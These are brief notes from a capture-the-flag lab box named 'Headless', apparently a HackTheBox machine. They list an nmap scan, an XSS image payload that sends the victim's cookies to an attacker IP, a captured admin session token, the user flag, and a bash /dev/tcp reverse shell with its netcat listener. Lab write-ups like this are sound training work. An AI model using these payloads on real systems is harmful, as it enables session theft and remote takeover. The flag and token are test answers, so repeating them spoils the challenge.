# Headless
ip: 10.10.11.8

## nmap report
command: `nmap -Pn ip` 
results:
```
PORT     STATE SERVICE
                                                                │22/tcp   open  ssh
                                                                │5000/tcp open  upnp
```
## xss

<img src="x" onerror=this.src='http://11.10.14.148:8001/?c='+document.cookie>

admin_token: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH1

## user flag
flag:33da9fa10057b8a84fc027dc09283777

## Reverse shell
`vittima: bash -i >& /dev/tcp/10.10.14.148/8001 0>&1
 attaccante: nc -u -lvp 8001 
` 
